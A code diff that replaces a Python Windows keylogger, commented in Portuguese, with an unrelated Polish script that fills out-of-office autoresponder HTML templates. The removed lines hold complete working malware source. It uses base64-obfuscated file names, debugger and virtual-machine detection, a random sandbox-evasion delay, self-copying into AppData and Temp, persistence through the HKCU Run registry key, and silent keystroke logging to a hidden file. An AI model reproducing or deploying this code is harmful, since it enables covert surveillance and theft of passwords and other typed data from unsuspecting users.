@@ -1,108 +1,58 @@
 import os
 import sys
-import shutil
-import winreg
-import threading
-import base64
-import random
-import time
-import ctypes
-import psutil
-from pynput import keyboard
-from datetime import datetime
 
-# === STRINGS FORTEMENTE OFUSCADAS ===
-DATA = {
-    "folder": base64.b64decode(b'V2luU3lz').decode(),  # WinSys
-    "filename": base64.b64decode(b'c3ZjLmV4ZQ==').decode(),  # svc.exe
-    "regname": base64.b64decode(b'U3lzdGVtU2VydmljZXM=').decode(),  # SystemServices
-    "logfile": base64.b64decode(b'ZGF0YXRyYWNrLmRhdA==').decode()  # datatrack.dat
-}
+def wypełnij_szablon(sciezka_szablonu, dane):
+    """Podmienia placeholdery w szablonie HTML na dane"""
+    if not os.path.isfile(sciezka_szablonu):
+        print(f"Błąd: brak szablonu {sciezka_szablonu}")
+        sys.exit(1)
+    with open(sciezka_szablonu, 'r', encoding='utf-8') as f:
+        szablon = f.read()
+    for klucz, wartosc in dane.items():
+        szablon = szablon.replace(f"{{{{{klucz}}}}}", wartosc)
+    return szablon
 
-# === CONFIG ===
-APPDATA_PATH = os.getenv('APPDATA')
-HIDDEN_DIR = os.path.join(APPDATA_PATH, DATA['folder'])
-NEW_EXEC_PATH = os.path.join(HIDDEN_DIR, DATA['filename'])
-LOG_PATH = os.path.join(HIDDEN_DIR, DATA['logfile'])
-PERSIST_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
+# Folder, w którym jest skrypt (i szablony)
+folder = os.path.dirname(os.path.abspath(__file__))
 
-# === UTILITÁRIOS ===
-def hide_console():
-    whnd = ctypes.windll.kernel32.GetConsoleWindow()
-    if whnd:
-        ctypes.windll.user32.ShowWindow(whnd, 0)
-
-def random_sleep():
-    """Delay aleatório para dificultar análise sandbox."""
-    time.sleep(random.randint(30, 120))
-
-def is_debugging():
-    """Detecta se está sendo debugado."""
-    is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
-    if is_debugger_present:
-        sys.exit()
-
-def is_virtual_machine():
-    """Detecta ambiente de máquina virtual simples."""
-    suspicious = ['vbox', 'vmware', 'virtual', 'xen', 'qemu']
-    for proc in psutil.process_iter(['name']):
-        try:
-            if any(s in proc.info['name'].lower() for s in suspicious):
-                sys.exit()
-        except (psutil.NoSuchProcess, psutil.AccessDenied):
-            continue
-
-def replicate_self():
-    """Copia-se para pasta oculta e para pasta Temp."""
-    if not os.path.exists(HIDDEN_DIR):
-        os.makedirs(HIDDEN_DIR)
-    temp_path = os.getenv('TEMP')
-
-    targets = [
-        os.path.join(HIDDEN_DIR, DATA['filename']),
-        os.path.join(temp_path, DATA['filename']),
-    ]
-
-    for target in targets:
-        if not os.path.exists(target):
-            shutil.copy2(sys.executable, target)
-
-def add_to_startup():
-    """Adiciona cópia ao registro para persistência."""
+# Pytamy ile będzie zastępców
+while True:
     try:
-        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(reg_key, DATA['regname'], 0, winreg.REG_SZ, NEW_EXEC_PATH)
-        winreg.CloseKey(reg_key)
-    except Exception:
-        pass
+        liczba_zastepcow = int(input("Ile będzie zastępców (1-3)? "))
+        if liczba_zastepcow in [1,2,3]:
+            break
+        else:
+            print("Proszę podać liczbę 1, 2 lub 3.")
+    except ValueError:
+        print("Proszę podać poprawną liczbę.")
 
-def start_keylogger():
-    """Captura silenciosa das teclas."""
-    def on_press(key):
-        try:
-            with open(LOG_PATH, 'a', encoding='utf-8') as log:
-                log.write(f"{datetime.now()} - {key.char}\n")
-        except AttributeError:
-            with open(LOG_PATH, 'a', encoding='utf-8') as log:
-                log.write(f"{datetime.now()} - {key}\n")
+# Dane osoby nieobecnej
+dane = {}
+dane["IMIE_NAZWISKO"] = input("Podaj imię i nazwisko osoby nieobecnej: ")
+dane["DATA_OD"] = input("Podaj datę rozpoczęcia urlopu (np. 22.09.2025): ")
+dane["DATA_DO"] = input("Podaj datę zakończenia urlopu (np. 03.10.2025): ")
 
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+# Dane zastępców
+for i in range(1, liczba_zastepcow + 1):
+    print(f"\n--- Zastępca {i} ---")
+    dane[f"ZASTEPCA{i}"] = input(f"Podaj imię i nazwisko zastępcy {i}: ")
+    dane[f"TELEFON_ZASTEPCA{i}"] = input(f"Podaj numer telefonu zastępcy {i} (np. +48603266737): ")
+    dane[f"EMAIL_ZASTEPCA{i}"] = input(f"Podaj adres e-mail zastępcy {i} (np. przyklad@domena.pl): ")
 
-def main():
-    hide_console()
-    is_debugging()
-    is_virtual_machine()
-    random_sleep()
-    replicate_self()
-    add_to_startup()
+# Wybór szablonu w zależności od liczby zastępców
+sciezka_szablonu = os.path.join(folder, f"autoresponder-{liczba_zastepcow}.html")
 
-    # Executar keylogger em uma thread para disfarçar
-    threading.Thread(target=start_keylogger, daemon=True).start()
+# Wypełnianie szablonu
+gotowy_html = wypełnij_szablon(sciezka_szablonu, dane)
 
-    # Thread principal "morta" (engana antivírus/sandbox)
-    while True:
-        time.sleep(60)
+# Tworzymy nazwę pliku: imie_nazwisko_dataod.html
+imie_nazwisko_clean = dane["IMIE_NAZWISKO"].replace(" ", "_")
+data_od_clean = dane["DATA_OD"].replace(".", "-")
+wyjscie = os.path.join(folder, f"{imie_nazwisko_clean}_{data_od_clean}.html")
 
-if __name__ == "__main__":
-    main()
+# Zapis do pliku
+with open(wyjscie, 'w', encoding='utf-8') as f:
+    f.write(gotowy_html)
+
+print(f"\nGotowy plik zapisany jako {wyjscie}")
+print("Możesz teraz zamknąć program.")
